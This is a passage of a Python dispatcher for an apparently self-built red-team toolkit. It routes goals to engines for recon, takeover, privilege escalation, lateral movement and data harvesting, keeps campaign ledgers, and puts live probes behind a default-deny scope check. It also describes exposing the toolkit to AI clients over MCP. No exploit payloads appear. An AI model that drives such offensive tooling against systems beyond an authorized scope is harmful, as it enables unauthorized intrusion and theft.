#!/usr/bin/env python3
"""
SPYDERMONKEY — master dispatcher of the HolyShit family. stdlib-only.

v4.0 — THE CONTROL PLANE. The v3 intelligence layer (phases, ledger, gate,
testers, chains, coverage, report, fleet) is now a hardened, machine-readable
engagement control plane: one shared scope authority, tamper-evident ledgers,
campaign lifecycle, JSON everywhere, a self-test that exercises the engines,
and real per-mandate contracts.

Commands:
  tree                    the family + roles + chain
  route    --goal "..."   goal → the mandate sequence to load/run
  version                 version + paths + engine summary
  campaign init|list|show|timeline|archive|purge
                          the engagement lifecycle (manifest · events · closeout)
  mandates list|show|verify
                          the ten mandate contracts (axis · commands · handoff)
  next     --target T     the one next action, with the exact command
  selftest                end-to-end self-test in a throwaway HOME (no estate)
  json mode               add --json to ANY command for machine output
  run      --target T --url U --domain D [--bundle P] [--boundary-url U2]
           [--probe-ids 1,2] [--parallel] [--resume] [--close] [--dry-run]
                          the full pipeline (delegates to SHIKI assault)
  mission  --target T --url U --domain D [--skip-fleet] [--close]
                          v3 ONE COMMAND: scope gate → fleet → ledger triage →
                          chain detect → coverage → war report
  phases   --target T     the 13-phase methodology board (lifecycle engine)
  ledger   add|list|show|triage --target T
                          the finding ledger: scope-blocked · deduped ·
                          evidence-gated (downgrade, NEVER suppress)
  gate     --target T --url U --attack-query Q [--baseline-query Q2]
                          the 3-gate confirmation engine: baseline → attack →
                          measurable diff (+ confirm token) → CONFIRMED
  chain    detect|plan --target T
                          10 chain patterns: low findings → high-impact kill chains
  context  set|show --target T
                          session context: endpoints · roles · credentials · functions
  testers  --target T --url U [--url U2…] [--demo]
                          18 parallel sub-testers (IDOR/AUTHZ/MASSASSIGN/
                          INJECTION/AUTHN/BIZLOGIC/SSRF/FILEATTACK/JWT/XSS/
                          SESSION/REDIRECT/CORS/NOSQL/CRLF/HARVEST/DIRECTORY/
                          REPLAY) over the session context
  coverage --target T     phase × deliverable matrix + ledger histogram + gaps
  report   --target T     the joint war report (findings+chains+phases+detection+pricing)
  relay    init|list|exec|remove
                          remote execution nodes (Bolt-equivalent): Ed25519 ssh pairs
  status   [--target T]   family meta-status (versions + engines + states)
  verify                  meta self-check: subcommands, mandate file, ten engines,
                          + LIVE gate proof against the built-in lab replica
  mandate  [--file]       print (or locate) the injectable persona contract
  scope    init|check|show  the scope authority (~/.redteam/scope.json) — the
                          machine-checkable estate gate every live probe honors
  doctor                  health check: engines · scope · campaigns · canon · ledger
  bench                   offline route-level benchmark (route accuracy)
  arsenal  list|plan|run|install  scope-gated execution layer + acquisition lane
  fleet    --goal G ...   PARALLEL multi-agent dispatch: one agent per mandate
  + bench_live.py         LIVE exploitation bench: stdlib vulnerable mini-targets
                          on localhost, real engines scored (sub-task completion)
  + mcp_server.py         the family as 18 MCP tools (stdio JSON-RPC) — any MCP
                          client (Claude Desktop/Cursor) drives the family
  + skilltree.py          per-technique skill files generated from the real canon,
                          WSTG/CWE/ATT&CK-bound (references/skills/ + index)

Live-fire rule (v4): a live HTTP engine (gate/testers/mission) fires at
127.0.0.1/localhost freely (the lab — dojo replicas, CI). ANY other host requires
a scope authority containing it: no authority or out-of-scope → rc=1 refusal.
The shared scope module is scripts/scope_authority.py — the dispatcher, arsenal,
MCP server and live bench all use the same verdict.

Exit codes: 0 ok · 1 gate/verify/scope failure · 2 usage error · 130 interrupted.
"""
from __future__ import annotations

import argparse
import contextlib
import csv
import hashlib
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

# The shared estate gate (same directory, stdlib-only). Imported by path so the
# dispatcher still works when invoked through a symlink or from any cwd.
sys.path.insert(0, str(Path(__file__).resolve().parent))
import scope_authority as sa  # noqa: E402
import context_router as cr  # noqa: E402

VERSION = "7.5.0"
SCHEMA = 4


class UsageError(Exception):
    """Bad invocation — translated to rc=2 by main()."""


class ScopeDenied(Exception):
    """The estate gate refused the action — translated to rc=1 by main()."""


SEC = Path.home() / ".hermes/skills/security"
FAMILY = {
    "barbican": (SEC / "barbican/scripts/barbican.py", "The Shield — first layer (vantage/identity/artifacts/wipe)"),
    "holyshit": (SEC / "holyshit-mode/scripts/finder.py", "The Finder — case canon, recon, dossiers, handoffs"),
    "undercroft": (SEC / "undercroft/scripts/undercroft.py", "The Descent — live auto-engagement on the target's own skin"),
    "3am": (SEC / "3am-shinjitsu/scripts/exploit-intel.py", "The Performer — universal sweep, takeover, growth loop"),
    "kairo": (SEC / "kairo/scripts/kairo.py", "The Synthesizer — findings → attacks for everyone"),
    "kaisha": (SEC / "kaisha/scripts/kaisha.py", "The Ladder — depth below the foothold (era-stack · privesc · lateral)"),
    "shukaku": (SEC / "shukaku/scripts/shukaku.py", "The Harvester — post-compromise catalog · price · disclose (the P5 impact layer)"),
    "shiki": (SEC / "shiki/scripts/shiki.py", "The Command — conducts the whole family as one assault"),
    "kage": (SEC / "kage/scripts/kage.py", "The Mirror — a detection rule for every confirmed attack (the purple layer)"),
    "dojo": (SEC / "dojo/scripts/dojo.py", "The Range — buildable vulnerable replicas of every technique class (where the family trains)"),
}

# The mandate contracts: axis, phase, the real engine command the dispatcher
# hands off to, and the fleet's capability pass. Single registry behind
# route/tree/fleet/mandates/next.
MANDATES = {
    "barbican": {
        "n": 0, "role": "THE SHIELD", "axis": "BEFORE — posture, vantage, identity, wipe",
        "phase": "scope_analysis",
        "handoff": "barbican posture --target <t> --vantage vm --alias <alias>   (FIRST)",
        "fleet": ["assess", "--target", "{target}"],
        "contract": "00-barbican.md",
    },
    "holyshit": {
        "n": 1, "role": "THE FINDER", "axis": "KNOWN — case canon, recon, dossiers, handoffs",
        "phase": "passive_recon",
        "handoff": "holyshit recon --domain <d> && holyshit dossier --target <t> → handoff",
        "fleet": ["dossier", "--target", "{target}"],
        "contract": "01-holyshit.md",
    },
    "undercroft": {
        "n": 2, "role": "THE DESCENT", "axis": "UNKNOWN — live auto-engagement, bundle/JWT/routes/boundary",
        "phase": "active_recon",
        "handoff": "undercroft run --target <t> --domain <d> --url <u> [--bundle P]",
        "fleet": ["probe"],
        "contract": "02-undercroft.md",
    },
    "3am": {
        "n": 3, "role": "THE PERFORMER", "axis": "KNOWABLE — universal sweep, takeover, growth loop",
        "phase": "authentication_testing",
        "handoff": "3AM sweep per its SKILL.md §16; absorb kairo's distributed rows first",
        "fleet": ["status", "--target", "{target}"],
        "contract": "03-3am.md",
    },
    "kairo": {
        "n": 4, "role": "THE SYNTHESIZER", "axis": "MANUFACTURING — findings → attacks → chains → distribution",
        "phase": "api_security",
        "handoff": "kairo forge --target <t> --expand && kairo chain --target <t> --write",
        "fleet": ["armory", "--target", "{target}"],
        "contract": "04-kairo.md",
    },
    "kaisha": {
        "n": 5, "role": "THE LADDER", "axis": "DEPTH — era-stack, privesc rungs, lateral movement",
        "phase": "infrastructure",
        "handoff": "kaisha ladder --target <t> --host <h> --access <confirmed> && kaisha lateral --target <t> --from <h>",
        "fleet": ["rungs", "--target", "{target}"],
        "contract": "05-kaisha.md",
    },
    "shukaku": {
        "n": 6, "role": "THE HARVESTER", "axis": "AFTER/GAIN — catalog, price, disclose, feed",
        "phase": "data_protection",
        "handoff": "shukaku ingest --target <t> --finding <id> --proof <ref> && shukaku reason --target <t> && shukaku hunt --target <t> [--live U] && shukaku crown … && shukaku feed --target <t> && shukaku report --target <t>",
        "fleet": ["ladder"],
        "contract": "06-shukaku.md",
    },
    "shiki": {
        "n": 7, "role": "THE COMMAND", "axis": "TOGETHER — the whole family as one assault",
        "phase": "reporting",
        "handoff": "shiki assault --target <t> --url <u> --domain <d> [--bundle P] [--parallel] [--resume] [--close]",
        "fleet": ["board", "--org", "{target}"],
        "contract": "07-shiki.md",
    },
    "kage": {
        "n": 8, "role": "THE MIRROR", "axis": "DETECTABLE — every confirmed attack becomes a detection rule",
        "phase": "reporting",
        "handoff": "kage mirror --target <t> && kage validate --target <t> && kage report --target <t>",
        "fleet": ["mirror", "--target", "{target}"],
        "contract": "08-kage.md",
    },
    "dojo": {
        "n": 9, "role": "THE RANGE", "axis": "TRAINING — vulnerable replicas and lessons, lab-bound",
        "phase": "reporting",
        "handoff": "dojo catalog && dojo build --class <C> --port <p>",
        "fleet": ["catalog"],
        "contract": "09-dojo.md",
    },
}

ROUTES = [
    ("protect", "barbican"), ("opsec", "barbican"), ("anonymous", "barbican"),
    ("vantage", "barbican"), ("posture", "barbican"), ("footprint", "barbican"),
    ("find", "holyshit"), ("recon", "holyshit"), ("dossier", "holyshit"),
    ("known", "holyshit"), ("case canon", "holyshit"), ("osint", "holyshit"),
    ("custom", "undercroft"), ("bundle", "undercroft"), ("business", "undercroft"),
    ("their code", "undercroft"), ("their logic", "undercroft"), ("api", "undercroft"),
    ("jwt", "undercroft"), ("surface", "undercroft"),
    ("attack", "3am"), ("sweep", "3am"), ("take over", "3am"), ("exploit", "3am"),
    ("takeover", "3am"), ("session", "3am"),
    ("arm", "kairo"), ("forge", "kairo"), ("vectors", "kairo"), ("weapons", "kairo"),
    ("chains", "kairo"), ("synthesize", "kairo"),
    ("harvest", "shukaku"), ("crown", "shukaku"), ("price", "shukaku"),
    ("valuation", "shukaku"), ("disclose", "shukaku"), ("impact", "shukaku"),
    ("what could they take", "shukaku"), ("exfil", "shukaku"),
    ("ladder", "kaisha"), ("climb", "kaisha"), ("deepen", "kaisha"),
    ("privesc", "kaisha"), ("privilege", "kaisha"), ("lateral", "kaisha"),
    ("foothold", "kaisha"), ("post-exploit", "kaisha"),
    ("detect", "kage"), ("mirror", "kage"), ("detection", "kage"),
    ("purple", "kage"), ("defend", "kage"), ("sigma", "kage"),
    ("blue team", "kage"), ("remediat", "kage"), ("harden", "kage"),
    ("train", "dojo"), ("range", "dojo"), ("replica", "dojo"), ("lab", "dojo"),
    ("lesson", "dojo"), ("practice", "dojo"),
    ("everything", "shiki"), ("full assault", "shiki"), ("together", "shiki"),
    ("one command", "shiki"), ("conduct", "shiki"),
    ("nmap", "arsenal"), ("nuclei", "arsenal"), ("tool", "arsenal"),
    ("scan", "arsenal"), ("port scan", "arsenal"), ("subdomain", "arsenal"),
    ("confirm", "spy"), ("baseline", "spy"), ("diff", "spy"), ("ledger", "spy"),
    ("coverage", "spy"), ("phase", "spy"), ("report", "spy"), ("remote", "spy"),
    ("relay", "spy"), ("node", "spy"), ("triage", "spy"), ("evidence", "spy"),
    ("campaign", "spy"), ("mission", "spy"),
]

RELAY = ["barbican", "holyshit", "undercroft", "kairo", "3am", "kaisha",
         "shukaku", "kage", "dojo"]

# stem-matching exceptions: noun forms that must NOT trigger the verb keyword
STEM_BLOCK = {"find": ("ings", "ing", "er")}


def _kw_hit(kw, goal):
    """Word-boundary keyword match. Single words match stems ('protect' hits
    'protecting'); multi-word phrases match on whitespace-separated tokens.
    Stem exceptions (STEM_BLOCK) keep noun forms from hijacking the route:
    'findings' is not the verb 'find'."""
    tokens = kw.split()
    parts = [r"\b" + re.escape(t) for t in tokens]
    block = STEM_BLOCK.get(kw)
    if block:
        parts[-1] += "(?!" + "|".join(b + r"\b" for b in block) + ")"
    parts[-1] += r"\w*"
    return re.search(r"\s+".join(parts), goal) is not None


CMDS = {name: meta["handoff"] for name, meta in MANDATES.items()}
CMDS["arsenal"] = "arsenal list && arsenal install --chain <c> && arsenal plan --target <t> && arsenal run --target <t>"
CMDS["spy"] = "spydermonkey gate run … | testers run … | ledger triage --target <t> | mission …"


# ── v4 core: paths · JSON · campaign lifecycle · routing ─────────────────────

def _json_mode(args) -> bool:
    return bool(getattr(args, "json", False))


def _emit(args, payload, text: str | None = None) -> None:
    """Machine output when --json is set, human output otherwise."""
    if _json_mode(args):
        print(json.dumps(payload, indent=2, sort_keys=False))
    elif text is not None:
        print(text)


def _root() -> Path:
    """The one data root: $SPYDERMONKEY_HOME or ~/.redteam."""
    return sa.redteam_home()


def _campaigns_root() -> Path:
    return sa.campaigns_root()


def _camp(target: str, create: bool = True) -> Path:
    try:
        name = sa.safe_name(target, "target")
    except sa.ScopeError as e:
        raise UsageError(str(e)) from e
    p = _campaigns_root() / name
    if create:
        p.mkdir(parents=True, exist_ok=True)
    return p


def _atomic_write(path: Path, text: str, mode: int | None = None) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    tmp = path.with_name(path.name + f".tmp.{os.getpid()}.{threading.get_ident()}")
    tmp.write_text(text)
    if mode is not None:
        try:
            os.chmod(tmp, mode)
        except OSError:
            pass
    os.replace(tmp, path)


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _sha(text: str) -> str:
    return hashlib.sha256((text or "").encode("utf-8", "replace")).hexdigest()


def _parse_ts(value: str | None) -> datetime | None:
    if not value:
        return None
    try:
        dt = datetime.fromisoformat(str(value).replace("Z", "+00:00"))
        return dt if dt.tzinfo else dt.replace(tzinfo=timezone.utc)
    except ValueError:
        return None


def _event(target: str, kind: str, detail: str = "", **extra) -> None:
    """Append to the campaign's tamper-apparent timeline. Never fatal."""
    try:
        row = {"at": _now(), "kind": kind, "detail": detail, **extra}
        p = _camp(target) / "events.jsonl"
        with p.open("a") as f:
            f.write(json.dumps(row) + "\n")
    except Exception:
        pass


def _manifest(target: str) -> dict:
    return _load_json(_camp(target) / "manifest.json", {})


def _save_manifest(target: str, data: dict) -> None:
    data = dict(data)
    data.update({"target": target, "version": VERSION, "updated": _now()})
    data.setdefault("created", data["updated"])
    _atomic_write(_camp(target) / "manifest.json",
                  json.dumps(data, indent=2) + "\n", mode=0o600)


def _ensure_campaign(target: str, url: str | None = None,
                     domain: str | None = None, objective: str = "") -> dict:
    m = _manifest(target)
    if not m:
        scope = sa.load_scope()
        m = {"engagement": (scope or {}).get("engagement", ""),
             "url": url or "", "domain": domain or "", "objective": objective,
             "created": _now(), "version": VERSION}
        _save_manifest(target, m)
        _event(target, "campaign.created", objective or "engagement opened")
    else:
        changed = False
        for k, v in (("url", url), ("domain", domain), ("objective", objective)):
            if v and not m.get(k):
                m[k] = v
                changed = True
        if changed:
            _save_manifest(target, m)
    return m


def _route_goal(goal: str) -> dict:
    """Score the goal against the route table. Returns the sequence + evidence."""
    g = (goal or "").lower()
    matched = []
    for kw, mandate in ROUTES:
        if _kw_hit(kw, g) and mandate not in [m[0] for m in matched]:
            matched.append((mandate, kw))
    seq = [m for m, _ in matched]
    override = None
    if "everything" in g or _kw_hit("assault", g) or _kw_hit("one command", g):
        override = "shiki"
        seq = ["shiki"]
    elif not seq:
        seq = list(RELAY)
    return {
        "goal": goal,
        "sequence": seq,
        "primary": seq[0],
        "matched": [{"mandate": m, "keyword": k} for m, k in matched],
        "override": override,
        "relay": seq == RELAY,
        "commands": [CMDS.get(m, "") for m in seq],
    }


def cmd_version(args):
    engines = {}
    for name, (script, _) in FAMILY.items():
        engines[name] = {"present": script.exists(), "path": str(script)}
    payload = {
        "name": "spydermonkey",
        "version": VERSION,
        "schema": SCHEMA,
        "python": sys.version.split()[0],
        "home": str(_root()),
        "scope": str(sa.scope_path()),
        "engines_present": sum(1 for e in engines.values() if e["present"]),
        "engines_total": len(engines),
        "engines": engines,
    }
    if _json_mode(args):
        _emit(args, payload)
    else:
        print(f"SPYDERMONKEY v{VERSION} (schema {SCHEMA}) · python {payload['python']}")
        print(f"  home:  {payload['home']}")
        print(f"  scope: {payload['scope']}")
        print(f"  engines: {payload['engines_present']}/{payload['engines_total']} present")
    return 0


def cmd_tree(args):
    sk = Path(__file__).resolve().parent.parent / "SKILL.md"
    if _json_mode(args):
        _emit(args, {"mandates": [
            {"name": n, "n": m["n"], "role": m["role"], "axis": m["axis"],
             "phase": m["phase"], "handoff": m["handoff"]}
            for n, m in MANDATES.items()], "relay": RELAY})
        return 0
    try:
        text = sk.read_text()
    except OSError:
        text = ""
    start = text.find("| # |")
    end = text.find("## The Router")
    if start >= 0 and end > start:
        print(text[start:end])
    else:
        print("═══ THE FAMILY — ten mandates, one axis each ═══")
        for name, m in MANDATES.items():
            print(f"  {m['n']}  {name:10s} {m['role']:16s} {m['axis']}")
        print("  relay: " + " → ".join(RELAY))
    return 0


def cmd_route(args):
    result = _route_goal(args.goal)
    if _json_mode(args):
        _emit(args, result)
        return 0
    print(f"▸ goal: '{args.goal}'")
    print(f"  → load + run, in order: {' → '.join(result['sequence'])}")
    if result["override"]:
        print(f"  (one-command override: {result['override']})")
    for m in result["sequence"]:
        print(f"  command: {CMDS.get(m, '')}")
    print("  always: barbican posture BEFORE, barbican wipe AFTER (closeout)")
    return 0


WALLS_ONELINER = ("declared estates only · documented-PoC adaptation · "
                  "validation-only NO-GAIN · never social / never third parties · "
                  "zero documents · destructive end-states refused → disclosure")


def cmd_inject(args):
    """THE CONTEXT PACKET (v7.4 — the retrieval layer): route verdict + kernel
    directive + session state + the top canon/skill/tool knowledge for the goal,
    in one compact block a model consumes as-is. No model needed to compose it:
    routing, planning and retrieval are deterministic policy in code."""
    _ensure_campaign(args.target)
    goal = args.goal or ""
    route = _route_goal(goal)
    nxt = _planner_directive(args.target)
    ctx = _load_json(_camp(args.target) / "context.json",
                     {"endpoints": [], "roles": [], "credentials": [],
                      "functions": []})
    ledger = _ledger_load(args.target)
    confirmed = [r for r in ledger if r.get("status") == "CONFIRMED"]
    classes = sorted({str(r.get("cls", "")).upper() for r in confirmed
                      if r.get("cls")})
    terms = " ".join([goal, route["primary"], *classes]).strip()
    kinds = tuple(k.strip() for k in args.kinds.split(",")
                  if k.strip()) if args.kinds else None
    hits = cr.query(terms, top=args.top, budget=args.budget, kinds=kinds)

    directive = None
    if nxt is not None:
        real = _autopilot_argv(nxt)
        directive = {"id": nxt.get("directive_id") or nxt.get("id"),
                     "mandate": nxt.get("mandate"),
                     "command": (" ".join(real) if real
                                 else "spydermonkey " + " ".join(nxt.get("argv", [])))}

    payload = {
        "target": args.target,
        "goal": goal,
        "route": {"primary": route["primary"], "sequence": route["sequence"]},
        "directive": directive,
        "state": {
            "endpoints": len(ctx.get("endpoints", [])),
            "roles": len(ctx.get("roles", [])),
            "credentials": len(ctx.get("credentials", [])),
            "functions": len(ctx.get("functions", [])),
            "confirmed": len(confirmed),
            "classes": classes,
        },
        "walls": WALLS_ONELINER,
        "knowledge": hits,
        "terms": terms,
    }
    if _json_mode(args):
        _emit(args, payload)
        return 0
    print(f"═══ CONTEXT PACKET — {args.target} ═══")
    print(f"ROUTE    : '{goal or '(no goal)'}' → {route['primary']}"
          + (f" (+ {' → '.join(route['sequence'][1:])})"
             if len(route['sequence']) > 1 else ""))
    if directive:
        print(f"DIRECTIVE: {directive['id']} · {directive['mandate']}"
              f" — {directive['command']}")
    else:
        print("DIRECTIVE: kernel — no open directive (all phases have deliverables)")
    st = payload["state"]
    print(f"STATE    : {st['endpoints']} endpoints · {st['roles']} roles · "
          f"{st['credentials']} creds · {st['functions']} funcs · "
          f"{st['confirmed']} confirmed"
          + (f" [{', '.join(st['classes'])}]" if st['classes'] else ""))
    print(f"WALLS    : {payload['walls']}")
    print(f"KNOWLEDGE ({len(hits)} hit(s) for '{terms}')")
    for h in hits:
        print(f"  [{h['kind']:8s}] {h['title']}")
        print(f"           {h['id']}  {h['tags']}")
        print(f"           {h['snippet'][:200]}")
    return 0


def cmd_run(args):
    """The full pipeline = SHIKI assault (the proven path)."""
    shiki = FAMILY["shiki"][0]
    argv = [str(shiki), "assault", "--target", args.target, "--url", args.url,
            "--domain", args.domain]
    if args.bundle:
        argv += ["--bundle", args.bundle]
    if args.boundary_url:
        argv += ["--boundary-url", args.boundary_url]
    if args.probe_ids:
        argv += ["--probe-ids", args.probe_ids]
    if args.parallel:
        argv += ["--parallel"]
    if args.resume:
        argv += ["--resume"]
    if args.close:
        argv += ["--close"]
    if args.dry_run:
        payload = {"command": argv, "dry_run": True, "executed": False}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print("▸ SPYDERMONKEY runs the family: shiki assault")
            print("  dry-run — the command that would execute:")
            print("    " + " ".join(argv))
        return 0
    for value in (args.url, args.domain):
        if not _scope_gate(value):
            return 1
    _ensure_campaign(args.target, url=args.url, domain=args.domain)
    if not _json_mode(args):
        print("▸ SPYDERMONKEY runs the family: shiki assault")
    _event(args.target, "run.start", "shiki assault", argv=argv)
    if not shiki.exists():
        payload = {"command": argv, "dry_run": False, "executed": False,
                   "rc": 1, "error": f"engine missing: {shiki}"}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"✗ shiki engine missing: {shiki}", file=sys.stderr)
        return 1
    r = subprocess.run(argv)
    _event(args.target, "run.end", f"rc={r.returncode}", rc=r.returncode)
    if _json_mode(args):
        _emit(args, {"command": argv, "dry_run": False, "executed": True,
                     "rc": r.returncode})
    return r.returncode


def _engine_verify(name: str, script: Path, timeout: int = 25) -> dict:
    if not script.exists():
        return {"name": name, "ok": False, "missing": True, "first": "MISSING",
                "role": FAMILY[name][1]}
    try:
        v = subprocess.run([sys.executable, str(script), "verify"],
                           capture_output=True, text=True, timeout=timeout)
        first = (v.stdout or v.stderr or "").splitlines()
        return {"name": name, "ok": v.returncode == 0, "missing": False,
                "first": first[0][:160] if first else "",
                "role": FAMILY[name][1]}
    except subprocess.TimeoutExpired:
        return {"name": name, "ok": False, "missing": False,
                "first": f"verify timed out after {timeout}s", "role": FAMILY[name][1]}


def _engine_status_all(fast: bool = False) -> list[dict]:
    if fast:
        return [{"name": n, "ok": p.exists(), "missing": not p.exists(),
                 "first": "present" if p.exists() else "MISSING", "role": role}
                for n, (p, role) in FAMILY.items()]
    out = {}
    threads = []

    def worker(name, script):
        out[name] = _engine_verify(name, script)

    for name, (script, _) in FAMILY.items():
        t = threading.Thread(target=worker, args=(name, script), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=30)
    rows = [out.get(n, {"name": n, "ok": False, "missing": True, "first": "no result",
                        "role": FAMILY[n][1]}) for n in FAMILY]
    # Engine self-checks may build lab replicas on fixed loopback ports. Running
    # all ten in parallel can make two healthy engines collide (the classic
    # dojo/kage race). Re-run failures one at a time: a real failure stays red,
    # a port collision goes green.
    if any(not e["ok"] and not e["missing"] for e in rows):
        for i, e in enumerate(rows):
            if e["ok"] or e["missing"]:
                continue
            retry = _engine_verify(e["name"], FAMILY[e["name"]][0])
            if retry["ok"]:
                retry["first"] = (retry.get("first") or "") + " (passed on serial retry)"
            rows[i] = retry
    return rows


def cmd_status(args):
    engines = _engine_status_all(fast=getattr(args, "fast", False))
    payload = {"version": VERSION, "engines": engines,
               "engines_up": sum(1 for e in engines if e["ok"]),
               "engines_total": len(engines)}
    if not _json_mode(args):
        print("═══ SPYDERMONKEY — family status ═══")
        print(f"  dispatcher v{VERSION} · home {_root()}")
        for e in engines:
            mark = "✓" if e["ok"] else "✗"
            print(f"  {mark} {e['name']:10s} {e['first'][:78]}")
            print(f"      {e['role']}")
    if args.target:
        _camp(args.target)
        m = _manifest(args.target)
        states = sorted(f.name for f in _camp(args.target).glob("*state*.json"))
        rows = _ledger_load(args.target)
        conf = sum(1 for l in rows if l.get("status") == "CONFIRMED")
        payload["campaign"] = {
            "target": args.target, "manifest": m, "states": states,
            "ledger_rows": len(rows), "confirmed": conf,
            "ledger_integrity": _ledger_integrity(args.target),
        }
        if not _json_mode(args):
            print(f"  campaign '{args.target}': {', '.join(states) or 'no states yet'}")
            print(f"  ledger: {len(rows)} finding(s) · {conf} confirmed"
                  f" · integrity {'✓' if not payload['campaign']['ledger_integrity'] else '✗'}")
    if _json_mode(args):
        _emit(args, payload)
    return 0


def cmd_verify(args):
    bad, warnings = [], []
    self = Path(__file__).resolve()
    help_out = subprocess.run([sys.executable, str(self), "--help"],
                              capture_output=True, text=True).stdout
    for want in ("tree", "route", "run", "status", "verify", "mandate", "scope",
                 "doctor", "bench", "fleet", "arsenal", "mission", "phases",
                 "ledger", "gate", "chain", "context", "testers", "coverage",
                 "report", "relay", "campaign", "mandates", "next", "selftest",
                 "crawl", "takeover", "capabilities", "protect", "train",
                 "memory", "remediate", "watch", "serve", "version", "catalog",
                 "inject", "foundation"):
        if want not in help_out:
            bad.append(f"subcommand {want}")
    mandate = self.parent.parent / "references" / "mandate.md"
    if not mandate.exists():
        bad.append("mandate file")
    if not (self.parent.parent / "references" / "mandate-pack.md").exists():
        bad.append("mandate pack file")
    if not (self.parent.parent / "references" / "foundation.md").exists():
        bad.append("foundation spec file")
    for meta in MANDATES.values():
        contract = self.parent.parent / "references" / "mandates" / meta["contract"]
        if not contract.exists():
            bad.append(f"mandate contract {meta['contract']}")
    if len(PHASES) != 13:
        bad.append("phases != 13")
    if len(CHAIN_PATTERNS) < 8:
        bad.append("chain patterns")
    if len(TESTERS) != 18:
        bad.append("testers != 18")
    # docs must carry the same version as the code
    for doc in ("README.md", "SKILL.md", "CHANGELOG.md"):
        p = self.parent.parent / doc
        if p.exists() and VERSION not in p.read_text(errors="replace"):
            warnings.append(f"{doc} does not mention v{VERSION}")

    engines = _engine_status_all(fast=getattr(args, "fast", False))
    missing = [e["name"] for e in engines if e["missing"]]
    broken = [e["name"] for e in engines if not e["missing"] and not e["ok"]]
    if missing:
        bad.append(f"engines missing: {', '.join(missing)}")
    if broken:
        bad.append(f"engines failing: {', '.join(broken)}")

    selftest = {"ok": True, "checks": []}
    if not getattr(args, "no_selftest", False):
        selftest = _run_selftest(quick=bool(getattr(args, "fast", False)))
        if not selftest["ok"]:
            bad.append("selftest")
    live = {"ok": True, "detail": "skipped (--fast)"}
    if not getattr(args, "fast", False):
        ok, detail = _verify_gate_live()
        live = {"ok": ok, "detail": detail}
        if not ok:
            bad.append("live gate proof")

    payload = {
        "version": VERSION, "ok": not bad, "errors": bad, "warnings": warnings,
        "engines": engines, "selftest": selftest, "live_gate": live,
    }
    if _json_mode(args):
        _emit(args, payload)
    else:
        if bad:
            print(f"✗ SPYDERMONKEY verify FAILED: {bad}")
            if missing:
                print(f"  ⚠ engines not installed: {', '.join(missing)}")
                print("    the dispatcher needs the family on disk — clone each repo into")
                print("    ~/.hermes/skills/security/<name>/ (see README → Quickstart)")
        else:
            print(f"✓ SPYDERMONKEY verify: v{VERSION} · all ten family engines — ALL PASS"
                  f" · selftest {selftest.get('passed', '?')}/{selftest.get('total', '?')}")
        for w in warnings:
            print(f"  ⚠ {w}")
        if not selftest.get("ok", False):
            for c in selftest.get("checks", []):
                if not c.get("ok"):
                    print(f"  ✗ selftest: {c.get('name')} — {c.get('detail', '')}")
    return 0 if not bad else 1


# ── v1.3.0 the scope authority · v4 shared module + lifecycle ─────────────────

def _load_scope(path=None):
    try:
        return sa.load_scope(path)
    except sa.ScopeError:
        return None


def _scope_match(scope, value):
    """Backward-compatible boolean wrapper around the shared matcher."""
    if scope is None:
        return False
    ok, _ = sa.match(scope, value)
    return ok


def _is_lab(value):
    return sa.is_lab(value)


def _scope_gate(value, quiet=False):
    """The live-fire gate. Lab hosts are lab-legal; everything else needs a
    non-expired scope authority containing it — default-deny. Returns bool."""
    ok, reason, _ = sa.check(value, strict=True, audit=not quiet, allow_lab=True)
    if not ok and not quiet:
        print(f"✗ LIVE-FIRE REFUSED — {value}: {reason}", file=sys.stderr)
        print("  init one: spydermonkey scope init --engagement E --in-scope <host,CIDR>",
              file=sys.stderr)
    return ok


def _split_values(raw: str | None) -> list[str]:
    return [s.strip() for s in (raw or "").split(",") if s.strip()]


def cmd_scope(args):
    action = args.action
    f = args.file
    if action == "init":
        if not args.engagement:
            raise UsageError("scope init needs --engagement")
        scope = {
            "schema": sa.SCHEMA,
            "engagement": args.engagement,
            "in_scope": _split_values(args.in_scope),
            "out_of_scope": _split_values(args.out_of_scope),
            "rules": {
                "max_rate_rps": args.max_rate if args.max_rate is not None else 10,
                "passive_first": True,
                "no_destructive": True,
                "require_scope_check": True,
                "allow_lab": True,
            },
            "expires": args.expires,
            "created": _now(),
            "updated": _now(),
        }
        if args.expires_days:
            from datetime import timedelta
            scope["expires"] = (datetime.now(timezone.utc)
                                + timedelta(days=args.expires_days)).isoformat()
        try:
            path = sa.save_scope(scope, f, force=args.force)
        except sa.ScopeError as e:
            print(f"✗ {e}", file=sys.stderr)
            return 1
        payload = {"path": str(path), **sa.summary(scope)}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"▸ scope authority written: {path}")
            print(f"  engagement: {scope['engagement']} · in-scope: {len(scope['in_scope'])}"
                  f" · out-of-scope: {len(scope['out_of_scope'])}"
                  + (f" · expires {scope['expires']}" if scope["expires"] else ""))
            print("  every live-probing engine checks this before firing (shared module)")
        _event(args.engagement or "scope", "scope.init", str(path))
        return 0
    if action == "check":
        if not args.value:
            raise UsageError("scope check needs --value")
        ok, reason, scope = sa.check(args.value, file=f, strict=True, audit=True)
        payload = {"value": args.value, "in_scope": ok, "reason": reason,
                   "engagement": (scope or {}).get("engagement"),
                   "expires": (scope or {}).get("expires")}
        if _json_mode(args):
            _emit(args, payload)
        elif ok:
            print(f"✓ IN SCOPE — {args.value} ({reason}; engagement"
                  f" '{(scope or {}).get('engagement', '?')}')")
        else:
            print(f"✗ OUT OF SCOPE — {args.value}: {reason}", file=sys.stderr)
        return 0 if ok else 1
    if action in ("show", "history"):
        if action == "history":
            rows = sa.history(args.limit or 40, file=f)
            if _json_mode(args):
                _emit(args, {"history": rows})
            elif not rows:
                print("· no scope audit history yet")
            else:
                print(f"═══ SCOPE AUDIT — last {len(rows)} verdict(s) ═══")
                for r in rows:
                    print(f"  {r.get('at', '')[:19]}  {r.get('verdict', '?'):3s}"
                          f"  {str(r.get('value', ''))[:52]:52s}  {r.get('reason', '')[:48]}")
            return 0
        try:
            scope = sa.load_scope(f)
        except sa.ScopeError as e:
            print(f"✗ {e}", file=sys.stderr)
            return 1
        if scope is None:
            if _json_mode(args):
                _emit(args, {"scope": None})
            else:
